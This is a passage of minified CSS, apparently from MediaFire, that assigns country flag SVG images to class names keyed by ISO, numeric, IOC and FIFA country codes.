.flag-flip-vertical{filter:none}.flag-abw,.flag-aw,.flag-533,.flag-ioc-aru,.flag-fifa-aru{background-image:url(//static.mediafire.com/images/flags_svg/abw.svg)}.flag-afg,.flag-af,.flag-4,.flag-ioc-afg,.flag-fifa-afg{background-image:url(//static.mediafire.com/images/flags_svg/afg.svg)}.flag-ago,.flag-ao,.flag-24,.flag-ioc-ang,.flag-fifa-ang{background-image:url(//static.mediafire.com/images/flags_svg/ago.svg)}.flag-aia,.flag-ai,.flag-660,.flag-ioc-aia,.flag-fifa-aia{background-image:url(//static.mediafire.com/images/flags_svg/aia.svg)}.flag-ala,.flag-ax,.flag-248,.flag-fifa-ald{background-image:url(//static.mediafire.com/images/flags_svg/ala.svg)}.flag-alb,.flag-al,.flag-8,.flag-ioc-alb,.flag-fifa-alb{background-image:url(//static.mediafire.com/images/flags_svg/alb.svg)}.flag-and,.flag-ad,.flag-20,.flag-ioc-and,.flag-fifa-and{background-image:url(//static.mediafire.com/images/flags_svg/and.svg)}.flag-are,.flag-ae,.flag-784,.flag-ioc-uae,.flag-fifa-uae{background-image:url(//static.mediafire.com/images/flags_svg/are.svg)}.flag-arg,.flag-ar,.flag-32,.flag-ioc-arg,.flag-fifa-arg{background-image:url(//static.mediafire.com/images/flags_svg/arg.svg)}.flag-arm,.flag-am,.flag-51,.flag-ioc-arm,.flag-fifa-arm{background-image:url(//static.mediafire.com/images/flags_svg/arm.svg)}.flag-asm,.flag-as,.flag-16,.flag-ioc-asa,.flag-fifa-asa{background-image:url(//static.mediafire.com/images/flags_svg/asm.svg)}.flag-ata,.flag-aq,.flag-10,.flag-fifa-ros{background-image:url(//static.mediafire.com/images/flags_svg/ata.svg)}.flag-atf,.flag-tf,.flag-260{background-image:url(//static.mediafire.com/images/flags_svg/atf.svg)}.flag-atg,.flag-ag,.flag-28,.flag-ioc-ant,.flag-fifa-atg{background-image:url(//static.mediafire.com/images/flags_svg/atg.svg)}.flag-aus,.flag-au,.flag-36,.flag-ioc-aus,.flag-fifa-aus{background-image:url(//static.mediafire.com/images/flags_svg/aus.svg)}.flag-aut,.flag-at,.flag-40,.flag-ioc-aut,.flag-fifa-aut{background-image:url(//static.mediafire.com/images/flags_svg/aut.svg)}.flag-aze,.flag-az,.flag-31,.flag-ioc-aze,.flag-fifa-aze{background-image:url(//static.mediafire.com/images/flags_svg/aze.svg)}.flag-bdi,.flag-bi,.flag-108,.flag-ioc-bdi,.flag-fifa-bdi{background-image:url(//static.mediafire.com/images/flags_svg/bdi.svg)}.flag-bel,.flag-be,.flag-56,.flag-ioc-bel,.flag-fifa-bel{background-image:url(//static.mediafire.com/images/flags_svg/bel.svg)}.flag-ben,.flag-bj,.flag-204,.flag-ioc-ben,.flag-fifa-ben{background-image:url(//static.mediafire.com/images/flags_svg/ben.svg)}.flag-bes,.flag-bq,.flag-535,.flag-ioc-aho,.flag-fifa-ant{background-image:url(//static.mediafire.com/images/flags_svg/bes.svg)}.flag-bfa,.flag-bf,.flag-854,.flag-ioc-bur,.flag-fifa-bfa{background-image:url(//static.mediafire.com/images/flags_svg/bfa.svg)}.flag-bgd,.flag-bd,.flag-50,.flag-ioc-ban,.flag-fifa-ban{background-image:url(//static.mediafire.com/images/flags_svg/bgd.svg)}.flag-bgr,.flag-bg,.flag-100,.flag-ioc-bul,.flag-fifa-bul{background-image:url(//static.mediafire.com/images/flags_svg/bgr.svg)}.flag-bhr,.flag-bh,.flag-48,.flag-ioc-brn,.flag-fifa-bhr{background-image:url(//static.mediafire.com/images/flags_svg/bhr.svg)}.flag-bhs,.flag-bs,.flag-44,.flag-ioc-bah,.flag-fifa-bah{background-image:url(//static.mediafire.com/images/flags_svg/bhs.svg)}.flag-bih,.flag-ba,.flag-70,.flag-ioc-bih,.flag-fifa-bih{background-image:url(//static.mediafire.com/images/flags_svg/bih.svg)}.flag-blm,.flag-bl,.flag-652{background-image:url(//static.mediafire.com/images/flags_svg/blm.svg)}.flag-blr,.flag-by,.flag-112,.flag-ioc-blr,.flag-fifa-blr{background-image:url(//static.mediafire.com/images/flags_svg/blr.svg)}.flag-blz,.flag-bz,.flag-84,.flag-ioc-biz,.flag-fifa-blz{background-image:url(//static.mediafire.com/images/flags_svg/blz.svg)}.flag-bmu,.flag-bm,.flag-60,.flag-ioc-ber,.flag-fifa-ber{background-image:url(//static.mediafire.com/images/flags_svg/bmu.svg)}.flag-bol,.flag-bo,.flag-68,.flag-ioc-bol,.flag-fifa-bol{background-image:url(//static.mediafire.com/images/flags_svg/bol.svg)}.flag-bra,.flag-br,.flag-76,.flag-ioc-bra,.flag-fifa-bra{background-image:url(//static.mediafire.com/images/flags_svg/bra.svg)}.flag-brb,.flag-bb,.flag-52,.flag-ioc-bar,.flag-fifa-brb{background-image:url(//static.mediafire.com/images/flags_svg/brb.svg)}.flag-brn,.flag-bn,.flag-96,.flag-ioc-bru,.flag-fifa-bru{background-image:url(//static.mediafire.com/images/flags_svg/brn.svg)}.flag-btn,.flag-bt,.flag-64,.flag-ioc-bhu,.flag-fifa-bhu{background-image:url(//static.mediafire.com/images/flags_svg/btn.svg)}.flag-bvt,.flag-bv,.flag-74{background-image:url(//static.mediafire.com/images/flags_svg/bvt.svg)}.flag-bwa,.flag-bw,.flag-72,.flag-ioc-bot,.flag-fifa-bot{background-image:url(//static.mediafire.com/images/flags_svg/bwa.svg)}.flag-caf,.flag-cf,.flag-140,.flag-ioc-caf,.flag-fifa-cta{background-image:url(//static.mediafire.com/images/flags_svg/caf.svg)}.flag-can,.flag-ca,.flag-124,.flag-ioc-can,.flag-fifa-can{background-image:url(//static.mediafire.com/images/flags_svg/can.svg)}.flag-cck,.flag-cc,.flag-166,.flag-fifa-cck{background-image:url(//static.mediafire.com/images/flags_svg/cck.svg)}.flag-che,.flag-ch,.flag-756,.flag-ioc-sui,.flag-fifa-sui{background-image:url(//static.mediafire.com/images/flags_svg/che.svg)}.flag-chl,.flag-cl,.flag-152,.flag-ioc-chi,.flag-fifa-chi{background-image:url(//static.mediafire.com/images/flags_svg/chl.svg)}.flag-chn,.flag-cn,.flag-156,.flag-ioc-chn,.flag-fifa-chn{background-image:url(//static.mediafire.com/images/flags_svg/chn.svg)}.flag-civ,.flag-ci,.flag-384,.flag-ioc-civ,.flag-fifa-civ{background-image:url(//static.mediafire.com/images/flags_svg/civ.svg)}.flag-cmr,.flag-cm,.flag-120,.flag-ioc-cmr,.flag-fifa-cmr{background-image:url(//static.mediafire.com/images/flags_svg/cmr.svg)}.flag-cod,.flag-cd,.flag-180,.flag-ioc-cod,.flag-fifa-cod{background-image:url(//static.mediafire.com/images/flags_svg/cod.svg)}.flag-cog,.flag-cg,.flag-178,.flag-ioc-cgo,.flag-fifa-cgo{background-image:url(//static.mediafire.com/images/flags_svg/cog.svg)}.flag-cok,.flag-ck,.flag-184,.flag-ioc-cok,.flag-fifa-cok{background-image:url(//static.mediafire.com/images/flags_svg/cok.svg)}.flag-col,.flag-co,.flag-170,.flag-ioc-col,.flag-fifa-col{background-image:url(//static.mediafire.com/images/flags_svg/col.svg)}.flag-com,.flag-km,.flag-174,.flag-ioc-com,.flag-fifa-com{background-image:url(//static.mediafire.com/images/flags_svg/com.svg)}.flag-cpv,.flag-cv,.flag-132,.flag-ioc-cpv,.flag-fifa-cpv{background-image:url(//static.mediafire.com/images/flags_svg/cpv.svg)}.flag-cri,.flag-cr,.flag-188,.flag-ioc-crc,.flag-fifa-crc{background-image:url(//static.mediafire.com/images/flags_svg/cri.svg)}.flag-cub,.flag-cu,.flag-192,.flag-ioc-cub,.flag-fifa-cub{background-image:url(//static.mediafire.com/images/flags_svg/cub.svg)}.flag-cuw,.flag-cw,.flag-531{background-image:url(//static.mediafire.com/images/flags_svg/cuw.svg)}.flag-cxr,.flag-cx,.flag-162,.flag-fifa-cxr{background-image:url(//static.mediafire.com/images/flags_svg/cxr.svg)}.flag-cym,.flag-ky,.flag-136,.flag-ioc-cay,.flag-fifa-cay{background-image:url(//static.mediafire.com/images/flags_svg/cym.svg)}.flag-cyp,.flag-cy,.flag-196,.flag-ioc-cyp,.flag-fifa-cyp{background-image:url(//static.mediafire.com/images/flags_svg/cyp.svg)}.flag-cze,.flag-cz,.flag-203,.flag-ioc-cze,.flag-fifa-cze{background-image:url(//static.mediafire.com/images/flags_svg/cze.svg)}.flag-deu,.flag-de,.flag-276,.flag-ioc-ger,.flag-fifa-ger{background-image:url(//static.mediafire.com/images/flags_svg/deu.svg)}.flag-dji,.flag-dj,.flag-262,.flag-ioc-dji,.flag-fifa-dji{background-image:url(//static.mediafire.com/images/flags_svg/dji.svg)}.flag-dma,.flag-dm,.flag-212,.flag-ioc-dma,.flag-fifa-dma{background-image:url(//static.mediafire.com/images/flags_svg/dma.svg)}.flag-dnk,.flag-dk,.flag-208,.flag-ioc-den,.flag-fifa-den{background-image:url(//static.mediafire.com/images/flags_svg/dnk.svg)}.flag-dom,.flag-do,.flag-214,.flag-ioc-dom,.flag-fifa-dom{background-image:url(//static.mediafire.com/images/flags_svg/dom.svg)}.flag-dza,.flag-dz,.flag-12,.flag-ioc-alg,.flag-fifa-alg{background-image:url(//static.mediafire.com/images/flags_svg/dza.svg)}.flag-ecu,.flag-ec,.flag-218,.flag-ioc-ecu,.flag-fifa-ecu{background-image:url(//static.mediafire.com/images/flags_svg/ecu.svg)}.flag-egy,.flag-eg,.flag-818,.flag-ioc-egy,.flag-fifa-egy{background-image:url(//static.mediafire.com/images/flags_svg/egy.svg)}.flag-eri,.flag-er,.flag-232,.flag-ioc-eri,.flag-fifa-eri{background-image:url(//static.mediafire.com/images/flags_svg/eri.svg)}.flag-esh,.flag-eh,.flag-732,.flag-fifa-sah{background-image:url(//static.mediafire.com/images/flags_svg/esh.svg)}.flag-esp,.flag-es,.flag-724,.flag-ioc-esp,.flag-fifa-esp{background-image:url(//static.mediafire.com/images/flags_svg/esp.svg)}.flag-est,.flag-ee,.flag-233,.flag-ioc-est,.flag-fifa-est{background-image:url(//static.mediafire.com/images/flags_svg/est.svg)}.flag-eth,.flag-et,.flag-231,.flag-ioc-eth,.flag-fifa-eth{background-image:url(//static.mediafire.com/images/flags_svg/eth.svg)}.flag-fin,.flag-fi,.flag-246,.flag-ioc-fin,.flag-fifa-fin{background-image:url(//static.mediafire.com/images/flags_svg/fin.svg)}.flag-fji,.flag-fj,.flag-242,.flag-ioc-fij,.flag-fifa-fij{background-image:url(//static.mediafire.com/images/flags_svg/fji.svg)}.flag-flk,.flag-fk,.flag-238,.flag-ioc-flk,.flag-fifa-flk{background-image:url(//static.mediafire.com/images/flags_svg/flk.svg)}.flag-fra,.flag-fr,.flag-250,.flag-ioc-fra,.flag-fifa-fra{background-image:url(//static.mediafire.com/images/flags_svg/fra.svg)}.flag-fro,.flag-fo,.flag-234,.flag-ioc-far,.flag-fifa-fro{background-image:url(//static.mediafire.com/images/flags_svg/fro.svg)}.flag-fsm,.flag-fm,.flag-583,.flag-ioc-fsm,.flag-fifa-fsm{background-image:url(//static.mediafire.com/images/flags_svg/fsm.svg)}.flag-gab,.flag-ga,.flag-266,.flag-ioc-gab,.flag-fifa-gab{background-image:url(//static.mediafire.com/images/flags_svg/gab.svg)}.flag-gbr,.flag-gb,.flag-826,.flag-ioc-gbr{background-image:url(//static.mediafire.com/images/flags_svg/gbr.svg)}.flag-geo,.flag-ge,.flag-268,.flag-ioc-geo,.flag-fifa-geo{background-image:url(//static.mediafire.com/images/flags_svg/geo.svg)}.flag-ggy,.flag-gg,.flag-831,.flag-fifa-gbg{background-image:url(//static.mediafire.com/images/flags_svg/ggy.svg)}.flag-gha,.flag-gh,.flag-288,.flag-ioc-gha,.flag-fifa-gha{background-image:url(//static.mediafire.com/images/flags_svg/gha.svg)}.flag-gib,.flag-gi,.flag-292,.flag-ioc-gib,.flag-fifa-gbz{background-image:url(//static.mediafire.com/images/flags_svg/gib.svg)}.flag-gin,.flag-gn,.flag-324,.flag-ioc-gui,.flag-fifa-gui{background-image:url(//static.mediafire.com/images/flags_svg/gin.svg)}.flag-glp,.flag-gp,.flag-312,.flag-ioc-gud,.flag-fifa-glp{background-image:url(//static.mediafire.com/images/flags_svg/glp.svg)}.flag-gmb,.flag-gm,.flag-270,.flag-ioc-gam,.flag-fifa-gam{background-image:url(//static.mediafire.com/images/flags_svg/gmb.svg)}.flag-gnb,.flag-gw,.flag-624,.flag-ioc-gbs,.flag-fifa-gnb{background-image:url(//static.mediafire.com/images/flags_svg/gnb.svg)}.flag-gnq,.flag-gq,.flag-226,.flag-ioc-geq,.flag-fifa-eqg{background-image:url(//static.mediafire.com/images/flags_svg/gnq.svg)}.flag-grc,.flag-gr,.flag-300,.flag-ioc-gre,.flag-fifa-gre{background-image:url(//static.mediafire.com/images/flags_svg/grc.svg)}.flag-grd,.flag-gd,.flag-308,.flag-ioc-grn,.flag-fifa-grn{background-image:url(//static.mediafire.com/images/flags_svg/grd.svg)}.flag-grl,.flag-gl,.flag-304,.flag-ioc-grl,.flag-fifa-grl{background-image:url(//static.mediafire.com/images/flags_svg/grl.svg)}.flag-gtm,.flag-gt,.flag-320,.flag-ioc-gua,.flag-fifa-gua{background-image:url(//static.mediafire.com/images/flags_svg/gtm.svg)}.flag-guf,.flag-gf,.flag-254,.flag-ioc-fgu,.flag-fifa-guf{background-image:url(//static.mediafire.com/images/flags_svg/guf.svg)}.flag-gum,.flag-gu,.flag-316,.flag-ioc-gum,.flag-fifa-gum{background-image:url(//static.mediafire.com/images/flags_svg/gum.svg)}.flag-guy,.flag-gy,.flag-328,.flag-ioc-guy,.flag-fifa-guy{background-image:url(//static.mediafire.com/images/flags_svg/guy.svg)}.flag-hkg,.flag-hk,.flag-344,.flag-ioc-hkg,.flag-fifa-hkg{background-image:url(//static.mediafire.com/images/flags_svg/hkg.svg)}.flag-hmd,.flag-hm,.flag-334{background-image:url(//static.mediafire.com/images/flags_svg/hmd.svg)}.flag-hnd,.flag-hn,.flag-340,.flag-ioc-hon,.flag-fifa-hon{background-image:url(//static.mediafire.com/images/flags_svg/hnd.svg)}.flag-hrv,.flag-hr,.flag-191,.flag-ioc-cro,.flag-fifa-cro{background-image:url(//static.mediafire.com/images/flags_svg/hrv.svg)}.flag-hti,.flag-ht,.flag-332,.flag-ioc-hai,.flag-fifa-hai{background-image:url(//static.mediafire.com/images/flags_svg/hti.svg)}.flag-hun,.flag-hu,.flag-348,.flag-ioc-hun,.flag-fifa-hun{background-image:url(//static.mediafire.com/images/flags_svg/hun.svg)}.flag-idn,.flag-id,.flag-360,.flag-ioc-ina,.flag-fifa-idn{background-image:url(//static.mediafire.com/images/flags_svg/idn.svg)}.flag-imn,.flag-im,.flag-833,.flag-fifa-gbm{background-image:url(//static.mediafire.com/images/flags_svg/imn.svg)}.flag-ind,.flag-in,.flag-356,.flag-ioc-ind,.flag-fifa-ind{background-image:url(//static.mediafire.com/images/flags_svg/ind.svg)}.flag-iot,.flag-io,.flag-86{background-image:url(//static.mediafire.com/images/flags_svg/iot.svg)}.flag-irl,.flag-ie,.flag-372,.flag-ioc-irl,.flag-fifa-irl{background-image:url(//static.mediafire.com/images/flags_svg/irl.svg)}.flag-irn,.flag-ir,.flag-364,.flag-ioc-iri,.flag-fifa-irn{background-image:url(//static.mediafire.com/images/flags_svg/irn.svg)}.flag-irq,.flag-iq,.flag-368,.flag-ioc-irq,.flag-fifa-irq{background-image:url(//static.mediafire.com/images/flags_svg/irq.svg)}.flag-isl,.flag-is,.flag-352,.flag-ioc-isl,.flag-fifa-isl{background-image:url(//static.mediafire.com/images/flags_svg/isl.svg)}.flag-isr,.flag-il,.flag-376,.flag-ioc-isr,.flag-fifa-isr{background-image:url(//static.mediafire.com/images/flags_svg/isr.svg)}.flag-ita,.flag-it,.flag-380,.flag-ioc-ita,.flag-fifa-ita{background-image:url(//static.mediafire.com/images/flags_svg/ita.svg)}.flag-jam,.flag-jm,.flag-388,.flag-ioc-jam,.flag-fifa-jam{background-image:url(//static.mediafire.com/images/flags_svg/jam.svg)}.flag-jey,.flag-je,.flag-832,.flag-fifa-gbj{background-image:url(//static.mediafire.com/images/flags_svg/jey.svg)}.flag-jor,.flag-jo,.flag-400,.flag-ioc-jor,.flag-fifa-jor{background-image:url(//static.mediafire.com/images/flags_svg/jor.svg)}.flag-jpn,.flag-jp,.flag-392,.flag-ioc-jpn,.flag-fifa-jpn{background-image:url(//static.mediafire.com/images/flags_svg/jpn.svg)}.flag-kaz,.flag-kz,.flag-398,.flag-ioc-kaz,.flag-fifa-kaz{background-image:url(//static.mediafire.com/images/flags_svg/kaz.svg)}.flag-ken,.flag-ke,.flag-404,.flag-ioc-ken,.flag-fifa-ken{background-image:url(//static.mediafire.com/images/flags_svg/ken.svg)}.flag-kgz,.flag-kg,.flag-417,.flag-ioc-kgz,.flag-fifa-kgz{background-image:url(//static.mediafire.com/images/flags_svg/kgz.svg)}.flag-khm,.flag-kh,.flag-116,.flag-ioc-cam,.flag-fifa-cam{background-image:url(//static.mediafire.com/images/flags_svg/khm.svg)}.flag-kir,.flag-ki,.flag-296,.flag-ioc-kir,.flag-fifa-kir{background-image:url(//static.mediafire.com/images/flags_svg/kir.svg)}.flag-kna,.flag-kn,.flag-659,.flag-ioc-skn,.flag-fifa-skn{background-image:url(//static.mediafire.com/images/flags_svg/kna.svg)}.flag-kor,.flag-kr,.flag-410,.flag-ioc-kor,.flag-fifa-kor{background-image:url(//static.mediafire.com/images/flags_svg/kor.svg)}.flag-kwt,.flag-kw,.flag-414,.flag-ioc-kuw,.flag-fifa-kuw{background-image:url(//static.mediafire.com/images/flags_svg/kwt.svg)}.flag-lao,.flag-la,.flag-418,.flag-ioc-lao,.flag-fifa-lao{background-image:url(//static.mediafire.com/images/flags_svg/lao.svg)}.flag-lbn,.flag-lb,.flag-422,.flag-ioc-lib,.flag-fifa-lib{background-image:url(//static.mediafire.com/images/flags_svg/lbn.svg)}.flag-lbr,.flag-lr,.flag-430,.flag-ioc-lbr,.flag-fifa-lbr{background-image:url(//static.mediafire.com/images/flags_svg/lbr.svg)}.flag-lby,.flag-ly,.flag-434,.flag-ioc-lba,.flag-fifa-lby{background-image:url(//static.mediafire.com/images/flags_svg/lby.svg)}.flag-lca,.flag-lc,.flag-662,.flag-ioc-lca,.flag-fifa-lca{background-image:url(//static.mediafire.com/images/flags_svg/lca.svg)}.flag-lie,.flag-li,.flag-438,.flag-ioc-lie,.flag-fifa-lie{background-image:url(//static.mediafire.com/images/flags_svg/lie.svg)}.flag-lka,.flag-lk,.flag-144,.flag-ioc-sri,.flag-fifa-sri{background-image:url(//static.mediafire.com/images/flags_svg/lka.svg)}.flag-lso,.flag-ls,.flag-426,.flag-ioc-les,.flag-fifa-les{background-image:url(//static.mediafire.com/images/flags_svg/lso.svg)}.flag-ltu,.flag-lt,.flag-440,.flag-ioc-ltu,.flag-fifa-ltu{background-image:url(//static.mediafire.com/images/flags_svg/ltu.svg)}.flag-lux,.flag-lu,.flag-442,.flag-ioc-lux,.flag-fifa-lux{background-image:url(//static.mediafire.com/images/flags_svg/lux.svg)}.flag-lva,.flag-lv,.flag-428,.flag-ioc-lat,.flag-fifa-lva{background-image:url(//static.mediafire.com/images/flags_svg/lva.svg)}.flag-mac,.flag-mo,.flag-446,.flag-ioc-mac,.flag-fifa-mac{background-image:url(//static.mediafire.com/images/flags_svg/mac.svg)}.flag-maf,.flag-mf,.flag-663{background-image:url(//static.mediafire.com/images/flags_svg/maf.svg)}.flag-mar,.flag-ma,.flag-504,.flag-ioc-mar,.flag-fifa-mar{background-image:url(//static.mediafire.com/images/flags_svg/mar.svg)}.flag-mco,.flag-mc,.flag-492,.flag-ioc-mon,.flag-fifa-mon{background-image:url(//static.mediafire.com/images/flags_svg/mco.svg)}.flag-mda,.flag-md,.flag-498,.flag-ioc-mda,.flag-fifa-mda{background-image:url(//static.mediafire.com/images/flags_svg/mda.svg)}.flag-mdg,.flag-mg,.flag-450,.flag-ioc-mad,.flag-fifa-mad{background-image:url(//static.mediafire.com/images/flags_svg/mdg.svg)}.flag-mdv,.flag-mv,.flag-462,.flag-ioc-mdv,.flag-fifa-mdv{background-image:url(//static.mediafire.com/images/flags_svg/mdv.svg)}.flag-mex,.flag-mx,.flag-484,.flag-ioc-mex,.flag-fifa-mex{background-image:url(//static.mediafire.com/images/flags_svg/mex.svg)}.flag-mhl,.flag-mh,.flag-584,.flag-ioc-msh,.flag-fifa-mhl{background-image:url(//static.mediafire.com/images/flags_svg/mhl.svg)}.flag-mkd,.flag-mk,.flag-807,.flag-ioc-mkd,.flag-fifa-mkd{background-image:url(//static.mediafire.com/images/flags_svg/mkd.svg)}.flag-mli,.flag-ml,.flag-466,.flag-ioc-mli,.flag-fifa-mli{background-image:url(//static.mediafire.com/images/flags_svg/mli.svg)}.flag-mlt,.flag-mt,.flag-470,.flag-ioc-mlt,.flag-fifa-mlt{background-image:url(//static.mediafire.com/images/flags_svg/mlt.svg)}.flag-mmr,.flag-mm,.flag-104,.flag-ioc-mya,.flag-fifa-mya{background-image:url(//static.mediafire.com/images/flags_svg/mmr.svg)}.flag-mne,.flag-me,.flag-499,.flag-ioc-mgo,.flag-fifa-mne{background-image:url(//static.mediafire.com/images/flags_svg/mne.svg)}.flag-mng,.flag-mn,.flag-496,.flag-ioc-mgl,.flag-fifa-mng{background-image:url(//static.mediafire.com/images/flags_svg/mng.svg)}.flag-mnp,.flag-mp,.flag-580,.flag-ioc-nma,.flag-fifa-nmi{background-image:url(//static.mediafire.com/images/flags_svg/mnp.svg)}.flag-moz,.flag-mz,.flag-508,.flag-ioc-moz,.flag-fifa-moz{background-image:url(//static.mediafire.com/images/flags_svg/moz.svg)}.flag-mrt,.flag-mr,.flag-478,.flag-ioc-mtn,.flag-fifa-mtn{background-image:url(//static.mediafire.com/images/flags_svg/mrt.svg)}.flag-msr,.flag-ms,.flag-500,.flag-ioc-mnt,.flag-fifa-msr{background-image:url(//static.mediafire.com/images/flags_svg/msr.svg)}.flag-mtq,.flag-mq,.flag-474,.flag-ioc-mrt,.flag-fifa-mtq{background-image:url(//static.mediafire.com/images/flags_svg/mtq.svg)}.flag-mus,.flag-mu,.flag-480,.flag-ioc-mri,.flag-fifa-mri{background-image:url(//static.mediafire.com/images/flags_svg/mus.svg)}.flag-mwi,.flag-mw,.flag-454,.flag-ioc-maw,.flag-fifa-mwi{background-image:url(//static.mediafire.com/images/flags_svg/mwi.svg)}.flag-mys,.flag-my,.flag-458,.flag-ioc-mas,.flag-fifa-mas{background-image:url(//static.mediafire.com/images/flags_svg/mys.svg)}.flag-myt,.flag-yt,.flag-175,.flag-ioc-may,.flag-fifa-myt{background-image:url(//static.mediafire.com/images/flags_svg/myt.svg)}.flag-nam,.flag-na,.flag-516,.flag-ioc-nam,.flag-fifa-nam{background-image:url(//static.mediafire.com/images/flags_svg/nam.svg)}.flag-ncl,.flag-nc,.flag-540,.flag-ioc-ncd,.flag-fifa-ncl{background-image:url(//static.mediafire.com/images/flags_svg/ncl.svg)}.flag-ner,.flag-ne,.flag-562,.flag-ioc-nig,.flag-fifa-nig{background-image:url(//static.mediafire.com/images/flags_svg/ner.svg)}.flag-nfk,.flag-nf,.flag-574,.flag-ioc-nfi,.flag-fifa-nfk{background-image:url(//static.mediafire.com/images/flags_svg/nfk.svg)}.flag-nga,.flag-ng,.flag-566,.flag-ioc-ngr,.flag-fifa-nga{background-image:url(//static.mediafire.com/images/flags_svg/nga.svg)}.flag-nic,.flag-ni,.flag-558,.flag-ioc-nca,.flag-fifa-nca{background-image:url(//static.mediafire.com/images/flags_svg/nic.svg)}.flag-niu,.flag-nu,.flag-570,.flag-ioc-niu,.flag-fifa-niu{background-image:url(//static.mediafire.com/images/flags_svg/niu.svg)}.flag-nld,.flag-nl,.flag-528,.flag-ioc-ned,.flag-fifa-ned{background-image:url(//static.mediafire.com/images/flags_svg/nld.svg)}.flag-nor,.flag-no,.flag-578,.flag-ioc-nor,.flag-fifa-nor{background-image:url(//static.mediafire.com/images/flags_svg/nor.svg)}.flag-npl,.flag-np,.flag-524,.flag-ioc-nep,.flag-fifa-nep{background-image:url(//static.mediafire.com/images/flags_svg/npl.svg)}.flag-nru,.flag-nr,.flag-520,.flag-ioc-nru,.flag-fifa-nru{background-image:url(//static.mediafire.com/images/flags_svg/nru.svg)}.flag-nzl,.flag-nz,.flag-554,.flag-ioc-nzl,.flag-fifa-nzl{background-image:url(//static.mediafire.com/images/flags_svg/nzl.svg)}.flag-omn,.flag-om,.flag-512,.flag-ioc-oma,.flag-fifa-oma{background-image:url(//static.mediafire.com/images/flags_svg/omn.svg)}.flag-pak,.flag-pk,.flag-586,.flag-ioc-pak,.flag-fifa-pak{background-image:url(//static.mediafire.com/images/flags_svg/pak.svg)}.flag-pan,.flag-pa,.flag-591,.flag-ioc-pan,.flag-fifa-pan{background-image:url(//static.mediafire.com/images/flags_svg/pan.svg)}.flag-pcn,.flag-pn,.flag-612,.flag-fifa-pcn{background-image:url(//static.mediafire.com/images/flags_svg/pcn.svg)}.flag-per,.flag-pe,.flag-604,.flag-ioc-per,.flag-fifa-per{background-image:url(//static.mediafire.com/images/flags_svg/per.svg)}.flag-phl,.flag-ph,.flag-608,.flag-ioc-phi,.flag-fifa-phi{background-image:url(//static.mediafire.com/images/flags_svg/phl.svg)}.flag-plw,.flag-pw,.flag-585,.flag-ioc-plw,.flag-fifa-plw{background-image:url(//static.mediafire.com/images/flags_svg/plw.svg)}.flag-png,.flag-pg,.flag-598,.flag-ioc-png,.flag-fifa-png{background-image:url(//static.mediafire.com/images/flags_svg/png.svg)}.flag-pol,.flag-pl,.flag-616,.flag-ioc-pol,.flag-fifa-pol{background-image:url(//static.mediafire.com/images/flags_svg/pol.svg)}.flag-pri,.flag-pr,.flag-630,.flag-ioc-pur,.flag-fifa-pur{background-image:url(//static.mediafire.com/images/flags_svg/pri.svg)}.flag-prk,.flag-kp,.flag-408,.flag-ioc-prk,.flag-fifa-prk{background-image:url(//static.mediafire.com/images/flags_svg/prk.svg)}.flag-prt,.flag-pt,.flag-620,.flag-ioc-por,.flag-fifa-por{background-image:url(//static.mediafire.com/images/flags_svg/prt.svg)}.flag-pry,.flag-py,.flag-600,.flag-ioc-par,.flag-fifa-par{background-image:url(//static.mediafire.com/images/flags_svg/pry.svg)}.flag-pse,.flag-ps,.flag-275,.flag-ioc-ple,.flag-fifa-ple{background-image:url(//static.mediafire.com/images/flags_svg/pse.svg)}.flag-pyf,.flag-pf,.flag-258,.flag-ioc-fpo,.flag-fifa-tah2{background-image:url(//static.mediafire.com/images/flags_svg/pyf.svg)}.flag-qat,.flag-qa,.flag-634,.flag-ioc-qat,.flag-fifa-qat{background-image:url(//static.mediafire.com/images/flags_svg/qat.svg)}.flag-reu,.flag-re,.flag-638,.flag-ioc-reu,.flag-fifa-reu{background-image:url(//static.mediafire.com/images/flags_svg/reu.svg)}.flag-rou,.flag-ro,.flag-642,.flag-ioc-rou,.flag-fifa-rou{background-image:url(//static.mediafire.com/images/flags_svg/rou.svg)}.flag-rus,.flag-ru,.flag-643,.flag-ioc-rus,.flag-fifa-rus{background-image:url(//static.mediafire.com/images/flags_svg/rus.svg)}.flag-rwa,.flag-rw,.flag-646,.flag-ioc-rwa,.flag-fifa-rwa{background-image:url(//static.mediafire.com/images/flags_svg/rwa.svg)}.flag-sau,.flag-sa,.flag-682,.flag-ioc-ksa,.flag-fifa-ksa{background-image:url(//static.mediafire.com/images/flags_svg/sau.svg)}.flag-sdn,.flag-sd,.flag-729,.flag-ioc-sud,.flag-fifa-sud{background-image:url(//static.mediafire.com/images/flags_svg/sdn.svg)}.flag-sen,.flag-sn,.flag-686,.flag-ioc-sen,.flag-fifa-sen{background-image:url(//static.mediafire.com/images/flags_svg/sen.svg)}.flag-sgp,.flag-sg,.flag-702,.flag-ioc-sin,.flag-fifa-sin{background-image:url(//static.mediafire.com/images/flags_svg/sgp.svg)}.flag-sgs,.flag-gs,.flag-239{background-image:url(//static.mediafire.com/images/flags_svg/sgs.svg)}.flag-shn,.flag-sh,.flag-654,.flag-ioc-hel,.flag-fifa-shn{background-image:url(//static.mediafire.com/images/flags_svg/shn.svg)}.flag-sjm,.flag-sj,.flag-744{background-image:url(//static.mediafire.com/images/flags_svg/sjm.svg)}.flag-slb,.flag-sb,.flag-90,.flag-ioc-sol,.flag-fifa-sol{background-image:url(//static.mediafire.com/images/flags_svg/slb.svg)}.flag-sle,.flag-sl,.flag-694,.flag-ioc-sle,.flag-fifa-sle{background-image:url(//static.mediafire.com/images/flags_svg/sle.svg)}.flag-slv,.flag-sv,.flag-222,.flag-ioc-esa,.flag-fifa-slv{background-image:url(//static.mediafire.com/images/flags_svg/slv.svg)}.flag-smr,.flag-sm,.flag-674,.flag-ioc-smr,.flag-fifa-smr{background-image:url(//static.mediafire.com/images/flags_svg/smr.svg)}.flag-som,.flag-so,.flag-706,.flag-ioc-som,.flag-fifa-som{background-image:url(//static.mediafire.com/images/flags_svg/som.svg)}.flag-spm,.flag-pm,.flag-666,.flag-ioc-spm,.flag-fifa-spm{background-image:url(//static.mediafire.com/images/flags_svg/spm.svg)}.flag-srb,.flag-rs,.flag-688,.flag-ioc-srb,.flag-fifa-srb{background-image:url(//static.mediafire.com/images/flags_svg/srb.svg)}.flag-ssd,.flag-ss,.flag-728{background-image:url(//static.mediafire.com/images/flags_svg/ssd.svg)}.flag-stp,.flag-st,.flag-678,.flag-ioc-stp,.flag-fifa-stp{background-image:url(//static.mediafire.com/images/flags_svg/stp.svg)}.flag-sur,.flag-sr,.flag-740,.flag-ioc-sur,.flag-fifa-sur{background-image:url(//static.mediafire.com/images/flags_svg/sur.svg)}.flag-svk,.flag-sk,.flag-703,.flag-ioc-svk,.